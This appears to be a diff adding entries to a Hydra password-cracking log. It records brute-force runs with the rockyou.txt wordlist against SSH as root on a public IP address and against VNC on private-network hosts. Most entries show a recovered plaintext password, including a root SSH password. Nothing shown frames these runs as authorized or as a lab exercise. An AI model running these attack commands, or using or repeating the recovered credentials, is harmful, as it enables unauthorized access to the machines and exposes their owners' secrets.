@@ -17,3 +17,13 @@
 # Hydra v9.5 run at 2023-07-06 17:10:02 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
 [22][ssh] host: 74.207.232.103   login: root   password: hejcot-1Savzu-simxyt
 # Hydra v9.5 run at 2023-07-06 18:05:06 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.80)
+# Hydra v9.5 run at 2023-07-06 18:22:41 on 192.168.1.13 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.13)
+[5900][vnc] host: 192.168.1.13   password: Highland1893
+# Hydra v9.5 run at 2023-07-06 18:23:43 on 192.168.1.13 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.13)
+[5900][vnc] host: 192.168.1.13   password: Pskov2006*
+# Hydra v9.5 run at 2023-07-06 18:25:10 on 192.168.1.13 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.13)
+[5900][vnc] host: 192.168.1.13   password: 945531
+# Hydra v9.5 run at 2023-07-06 18:25:56 on 192.168.1.13 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.13)
+[5900][vnc] host: 192.168.1.13   password: hejcot-1Savzu-simxyt
+# Hydra v9.5 run at 2023-07-06 18:28:11 on 192.168.1.13 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.13)
+[5900][vnc] host: 192.168.1.13   password: Pskov2006*
